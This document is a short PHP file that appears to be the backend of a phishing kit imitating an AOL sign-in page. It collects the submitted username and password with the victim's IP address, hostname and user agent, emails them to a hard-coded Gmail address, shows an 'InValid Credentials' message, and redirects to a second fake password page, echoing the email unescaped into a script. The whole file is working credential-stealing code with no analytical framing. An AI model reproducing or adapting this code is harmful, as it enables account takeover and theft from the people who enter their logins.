<?php
session_start();
$email = trim($_POST['username']);
$password = trim($_POST['password']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Resultz |--------------|\n";
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------------------|\n";
	$send = "andalas.mail2@gmail.com";
	$subject = "Aol l $ip";
	$headers = "From: Result@cok.com";
    mail($send, $subject, $message,$headers);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>
<script>
	window.location="password2.php?email=<?php echo $email ?>&?done=https%3A%2F%2Fwww.aol.com%2F&acrumb=2gpYKtio&display=login&authMechanism=primary&sessionIndex=Qg--&e=true&pcn=password";
</script>